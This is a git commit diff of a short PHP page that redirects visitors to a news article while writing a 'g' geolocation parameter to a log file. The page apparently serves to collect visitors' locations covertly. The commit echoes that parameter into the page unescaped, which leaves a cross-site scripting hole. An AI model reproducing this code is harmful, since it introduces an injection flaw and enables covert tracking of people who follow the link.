f795433a29dbdcd2459722a70294a6f0b087ef67
Yuval Avidani <48050809+hoodini@users.noreply.github.com>
2022-03-09 12:08:37 +0200

    echo

--- server.php
+++ server.php
@@ -1,6 +1,10 @@
 <?php
 header ('Location:https://www.ynet.co.il/entertainment/article/s1owkck2t');
 $geolocation = $_GET["g"];
+echo "<h1>Weclome</h1>";
+echo "<h2>";
+echo $geolocation;
+echo "</h2>";
 $file = fopen('log.txt', 'a');
 fwrite($file, $geolocation . "\n\n");
 ?>
